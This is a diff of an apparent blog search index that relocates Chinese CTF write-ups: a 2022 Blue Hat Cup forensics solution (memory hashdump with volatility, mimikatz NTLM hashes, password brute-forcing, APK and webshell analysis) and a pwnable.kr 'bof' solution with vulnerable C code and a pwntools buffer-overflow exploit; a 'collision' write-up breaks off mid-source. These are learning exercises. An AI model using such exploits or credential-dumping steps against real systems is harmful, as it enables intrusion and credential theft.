@@ -259,128 +259,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2022蓝帽杯初赛WP</title>
-    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/</url>
-    <content><![CDATA[<h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700049682.gif" class="" title="图片">
-
-<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
-<p>在tcp追踪流13发现了有用信息</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004.gif" class="" title="图片">
-
-<p>阅读拼接进行base64解密试试</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006.gif" class="" title="图片">
-
-<p>发现了密码，解压压缩包</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008.gif" class="" title="图片">
-
-<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010.gif" class="" title="图片">
-
-
-
-<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700345378.gif" class="" title="图片">
-
-<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-16573700345389.gif" class="" title="图片">
-
-
-
-<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737006076812.gif" class="" title="图片">
-
-<p>果然，在群组聊天中找到了快递单号</p>
-<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737008500914.gif" class="" title="图片">
-
-<p>找到了，发现是md5加密过的，md5解密</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737008501015.gif" class="" title="图片">得到开机密码anxinqi
-
-<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737010442218.gif" class="" title="图片">
-
-<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737010442219.gif" class="" title="图片">
-
-<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
-<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.jpg" class="" title="图片">
-
-<p>导出了三个文件，其中就有ppt</p>
-<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737014552022.gif" class="" title="图片">
-
-<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737014552023.gif" class="" title="图片">
-
-<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737014552024.gif" class="" title="图片">
-
-
-
-<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
-<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737018007529.gif" class="" title="图片">
-
-<p>导出keyfile</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737018007531.gif" class="" title="图片">
-
-<p>新建案例，开始取证</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737018007530.gif" class="" title="图片">
-
-<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737018007532.gif" class="" title="图片">
-
-<p>打开压缩包，得到flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010-165737018007533.gif" class="" title="图片">
-
-<p>flag{1349934913913991394cacacacacacc}</p>
-<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
-<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190538890.png" class="" title="image-20220709190538890">
-
-<p>所以flag为“exec.azj.kny.d.c”。</p>
-<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190735776.png" class="" title="image-20220709190735776">
-
-<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
-<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
-<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191141536.png" class="" title="image-20220709191141536">
-
-<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
-<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
-<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
-<p>根据关键词查找发现如下内容</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191504565.png" class="" title="image-20220709191504565">
-
-<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191701294.png" class="" title="image-20220709191701294">
-
-<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
-<p>所以flag为“a”</p>
-<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.gif" class="" title="图片">
-
-<p>d盾扫描获得flag</p>
-<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202049506.png" class="" title="image-20220709202049506">
-
-
-
-<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-        <tag>取证</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022浙江省ctf初赛</title>
     <url>/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/</url>
     <content><![CDATA[<blockquote>
@@ -533,6 +411,128 @@
         <tag>misc</tag>
         <tag>web</tag>
         <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2022蓝帽杯初赛WP</title>
+    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/</url>
+    <content><![CDATA[<h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700049682.gif" class="" title="图片">
+
+<p>在这里找到了rar文件，导出后发现需要密码，于是继续探索</p>
+<p>在tcp追踪流13发现了有用信息</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004.gif" class="" title="图片">
+
+<p>阅读拼接进行base64解密试试</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006.gif" class="" title="图片">
+
+<p>发现了密码，解压压缩包</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008.gif" class="" title="图片">
+
+<p>发现是mimikatz工具的界面，于是在NTLM这里找到了hash值</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010.gif" class="" title="图片">
+
+
+
+<h1 id="手机取证-1"><a href="#手机取证-1" class="headerlink" title="手机取证_1"></a>手机取证_1</h1><p>用盘古石阅读器打开，搜索题目给出的图片的名字</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-16573700345378.gif" class="" title="图片">
+
+<p>导出该图片，并查看该图片属性的详细信息，得到分辨率360x360</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-16573700345389.gif" class="" title="图片">
+
+
+
+<h1 id="手机取证-2"><a href="#手机取证-2" class="headerlink" title="手机取证_2"></a>手机取证_2</h1><p>题目要求是说让我们找到姜总的快递单号，那么试着搜索下关键字姜总</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737006076812.gif" class="" title="图片">
+
+<p>果然，在群组聊天中找到了快递单号</p>
+<h1 id="计算机取证-1"><a href="#计算机取证-1" class="headerlink" title="计算机取证_1"></a>计算机取证_1</h1><p>读题发现是内存取证，想到使用工具volatility，第一个要求我们获得taqi7的开机密码，于是用volatility跑跑看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 hashdump</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737008500914.gif" class="" title="图片">
+
+<p>找到了，发现是md5加密过的，md5解密</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737008501015.gif" class="" title="图片">得到开机密码anxinqi
+
+<h1 id="计算机取证-2"><a href="#计算机取证-2" class="headerlink" title="计算机取证_2"></a>计算机取证_2</h1><p>看下题目，要求我们查看进程号，volatility跑一下进程号看看，语句：.&#x2F;volatility_2.6_win64_standalone.exe -f 1.dmp –profile&#x3D;Win7SP1x64 pstree</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737010442218.gif" class="" title="图片">
+
+<p>看着这个很可疑，但我并不认识，上网搜一搜MagnetRAMCaptu</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737010442219.gif" class="" title="图片">
+
+<p>看到这里便可以放心提交答案了，查看下pid是2192</p>
+<h1 id="计算机取证-3"><a href="#计算机取证-3" class="headerlink" title="计算机取证_3"></a>计算机取证_3</h1><p>看题发现这个是磁盘性质的取证题了，于是用取证大师</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.jpg" class="" title="图片">
+
+<p>导出了三个文件，其中就有ppt</p>
+<p>word和ppt需要密码，还有一个是字典，立马想到了爆破，用passfab for word</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737014552022.gif" class="" title="图片">
+
+<p>文档密码是688561，打开没有发现什么，把ppt后缀改成docx也一样进行爆破</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737014552023.gif" class="" title="图片">
+
+<p>得到密码287fuweiuhfiute，改回后缀，输入密码打开，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737014552024.gif" class="" title="图片">
+
+
+
+<h1 id="计算机取证-4"><a href="#计算机取证-4" class="headerlink" title="计算机取证_4"></a>计算机取证_4</h1><p>在e01文件中bitlocker解密出来，发现tc加密文件，寻找密钥</p>
+<p>根据题目提示，使用取证大师的工具：内存镜像解析工具进行解析</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002-165737018007529.gif" class="" title="图片">
+
+<p>导出keyfile</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image004-165737018007531.gif" class="" title="图片">
+
+<p>新建案例，开始取证</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image006-165737018007530.gif" class="" title="图片">
+
+<p>发现哈哈哈.zip，导出该zip，直接暴力破解，得到密码991314</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image008-165737018007532.gif" class="" title="图片">
+
+<p>打开压缩包，得到flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image010-165737018007533.gif" class="" title="图片">
+
+<p>flag{1349934913913991394cacacacacacc}</p>
+<h1 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析_1"></a>程序分析_1</h1><p> 将文件下载下来，然后将后缀改为”.zip”，拖入winrar中将配置文件AndroidManifest.xml解压出来。</p>
+<p>然后利用工具AXMLPrinter2将配置文件反编译，编译出来的文件内容中可以看到package字段如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190538890.png" class="" title="image-20220709190538890">
+
+<p>所以flag为“exec.azj.kny.d.c”。</p>
+<h1 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析_2"></a>程序分析_2</h1><p>上题反编译出来的配置文件中有如下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709190735776.png" class="" title="image-20220709190735776">
+
+<p>“android.intent.action.MAIN”则代表文集入口“属性”，外面一层的activity标签中的android name值就是入口程序</p>
+<p>所以flag为”minmtta.hemjcbm.ahibyws.MainActivity”.</p>
+<h1 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析_3"></a>程序分析_3</h1><p>将下载下来的文件拖入bytecode viewer中，根据上题的程序入口目录进去，可出现下图所示内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191141536.png" class="" title="image-20220709191141536">
+
+<p>根据代码大致就可以猜测base64解密的内容就是密文。</p>
+<p>所以flag为“aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6”</p>
+<h1 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析_4"></a>程序分析_4</h1><p>在bytecode viewer中可以看到很多被混淆加密的包，安全检测类很可能就在里面</p>
+<p>根据关键词查找发现如下内容</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191504565.png" class="" title="image-20220709191504565">
+
+<p>这应该就是与检测相关的一个类，但起不到检测的作用。再去上级目录看，看到class a中有下图所示关键字段</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709191701294.png" class="" title="image-20220709191701294">
+
+<p>qemu是Android模拟器，用来模拟检测的，所以猜测这个类就是了。</p>
+<p>所以flag为“a”</p>
+<h1 id="网站取证-1"><a href="#网站取证-1" class="headerlink" title="网站取证_1"></a>网站取证_1</h1><p>题目提示有后门</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/clip_image002.gif" class="" title="图片">
+
+<p>d盾扫描获得flag</p>
+<h1 id="网站取证-2"><a href="#网站取证-2" class="headerlink" title="网站取证_2"></a>网站取证_2</h1><p>查看database.php发现密码与my_encrypt()有关，发现该函数在encrypt.php中将encrypt.php部署到本地环境中跑一下，获得flag</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202049506.png" class="" title="image-20220709202049506">
+
+
+
+<h1 id="网站取证-3"><a href="#网站取证-3" class="headerlink" title="网站取证_3"></a>网站取证_3</h1><p>在Channelorder.php和Channelorderlist.php中都有盐值即$key</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/image-20220709202224818.png" class="" title="image-20220709202224818">
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>取证</tag>
       </tags>
   </entry>
   <entry>
@@ -1023,6 +1023,28 @@
       </tags>
   </entry>
   <entry>
+    <title>bof</title>
+    <url>/2022/07/12/bof(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
+<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
+
+<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(NCTF2019)Fake XML cookbook</title>
     <url>/2022/07/02/%5BNCTF2019%5DFake%20XML%20cookbook/</url>
     <content><![CDATA[<p>点击进入题目是一个登陆界面</p>
@@ -1048,28 +1070,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/2022/07/12/bof(wp)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
-<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
-
-<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwnable刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1284,29 +1284,6 @@
       </tags>
   </entry>
   <entry>
-    <title>collision</title>
-    <url>/2022/07/12/collision(wp)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span 